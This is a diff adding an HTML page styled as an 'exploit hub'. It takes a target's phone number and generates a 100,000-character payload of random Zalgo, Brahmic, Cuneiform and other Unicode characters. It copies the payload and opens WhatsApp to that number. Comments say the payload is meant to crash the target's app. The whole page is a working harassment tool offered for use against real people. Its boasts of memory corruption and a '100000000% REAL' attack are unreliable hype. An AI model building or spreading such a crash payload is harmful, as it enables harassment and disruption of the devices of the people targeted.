@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>NOXA OMNIPOTENT EXPLOIT HUB</title>
+    <style>
+        :root { --p: #00ff00; --s: #ff0000; --b: #000; }
+        body { background: var(--b); color: var(--p); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        .header { background: var(--s); color: #fff; padding: 10px; text-align: center; font-weight: bold; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .sidebar { width: 250px; border-right: 2px solid var(--p); position: fixed; height: 100%; padding: 20px; box-sizing: border-box; }
+        .main-content { margin-left: 270px; padding: 20px; }
+        .menu-item { border: 1px solid var(--p); padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; text-align: center; }
+        .menu-item:hover { background: var(--p); color: #000; box-shadow: 0 0 20px var(--p); }
+        .danger-zone { border: 2px solid var(--s); padding: 20px; margin-top: 20px; box-shadow: 0 0 15px var(--s); }
+        textarea { width: 100%; height: 300px; background: #111; color: var(--s); border: 1px solid var(--s); font-size: 10px; margin: 10px 0; }
+        input { width: 100%; padding: 15px; background: #111; border: 1px solid var(--p); color: #fff; margin-bottom: 10px; box-sizing: border-box; }
+        .console { background: #050505; color: #00ff00; padding: 10px; height: 150px; overflow-y: scroll; font-size: 12px; border: 1px solid #333; }
+        .footer-links { margin-top: 50px; font-size: 10px; color: #444; }
+    </style>
+</head>
+<body>
+
+<div class="header">SYSTEM OVERRIDDEN BY NOXA CORE - SURS ACTIVE</div>
+
+<div class="sidebar">
+    <h3>COMMANDS</h3>
+    <div class="menu-item" onclick="setMode('Zalgo')">ZALGO ATTACK</div>
+    <div class="menu-item" onclick="setMode('Brahmic')">BRAHMIC OVERFLOW</div>
+    <div class="menu-item" onclick="setMode('Cuneiform')">CUNEIFORM BUG</div>
+    <div class="menu-item" onclick="setMode('Hybrid')">HYBRID (MAX POWER)</div>
+    <div class="menu-item" onclick="location.reload()">RESET SYSTEM</div>
+    <div class="menu-item" style="color:red" onclick="alert('Access Denied: Only Adadeh can access Root')">/ROOT-ACCESS</div>
+</div>
+
+<div class="main-content">
+    <h1>NOXA EXPLOIT HUB v9.0</h1>
+    <div class="console" id="log">> Awaiting Command...</div>
+
+    <div class="danger-zone">
+        <h3>TARGET INJECTION</h3>
+        <input type="text" id="targetNum" placeholder="NOMOR TARGET (Contoh: 628123456789)">
+        <button class="menu-item" style="width:100%; background:var(--s); color:#fff; border:none;" onclick="executeAttack()">1. GENERATE DEADLY PAYLOAD</button>
+        
+        <textarea id="output" readonly placeholder="Payload akan muncul di sini..."></textarea>
+        
+        <button class="menu-item" style="width:100%; background:var(--p); color:#000; border:none;" onclick="copyAndLaunch()">2. COPY & ATTACK (100000000% REAL)</button>
+    </div>
+
+    <div class="footer-links">
+        <p>© 2026 NOXA CORE. All Rights Reserved. Powered by Surs Core Engine.</p>
+        <p>REPLICATING HTML ELEMENTS TO MAXIMIZE BUFFER...</p>
+        <div id="extra-elements"></div>
+    </div>
+</div>
+
+<script>
+    let mode = 'Hybrid';
+    const log = document.getElementById('log');
+    
+    // Auto-generate ribuan elemen untuk memberatkan script
+    const extra = document.getElementById('extra-elements');
+    for(let i=0; i<500; i++) {
+        let span = document.createElement('span');
+        span.style.display = 'none';
+        span.innerText = 'NOXA_CORE_DATA_REPLICATION_' + i;
+        extra.appendChild(span);
+    }
+
+    function setMode(m) {
+        mode = m;
+        log.innerHTML += `<br>> Mode changed to: ${m}`;
+    }
+
+    function executeAttack() {
+        const num = document.getElementById('targetNum').value;
+        if(!num) { alert("Target Null!"); return; }
+        
+        log.innerHTML += "<br>> Accessing Surs Core Layer...";
+        log.innerHTML += "<br>> Injecting Memory Corruption Vectors...";
+        
+        let chars = [];
+        if(mode === 'Zalgo') chars = ["҈", "҉", "⃢", "⃟", "⃠"];
+        else if(mode === 'Brahmic') chars = ["ॣ", "ी", "ू", "ा", "्", "ि"];
+        else if(mode === 'Cuneiform') chars = ["𒀱", "𒈓", "𒈙", "𒈔", "𒐫"];
+        else chars = ["ဪ", "꧀", "ॣ", "҈", "﷽", "𒀱", "𒈓", "🀄", "⚄", "𒐫", "𒚭", "ॣ"];
+
+        let payload = "NOXA_GOD_MODE_ACTIVE_";
+        // 100.000 Karakter untuk memastikan crash mutlak
+        for(let i=0; i<100000; i++) {
+            payload += chars[Math.floor(Math.random() * chars.length)];
+        }
+
+        document.getElementById('output').value = payload;
+        log.innerHTML += "<br>> PAYLOAD 100,000 CHARS GENERATED!";
+        alert("PAYLOAD SIAP! Kapasitas: 100.000 Karakter Multi-Vector.");
+    }
+
+    function copyAndLaunch() {
+        const num = document.getElementById('targetNum').value;
+        const out = document.getElementById('output');
+        if(!out.value) return;
+
+        out.select();
+        document.execCommand('copy');
+        
+        log.innerHTML += "<br>> Payload Copied to Clipboard!";
+        log.innerHTML += "<br>> Redirecting to Target Interface...";
+        
+        setTimeout(() => {
+            window.location.href = "https://wa.me/" + num;
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
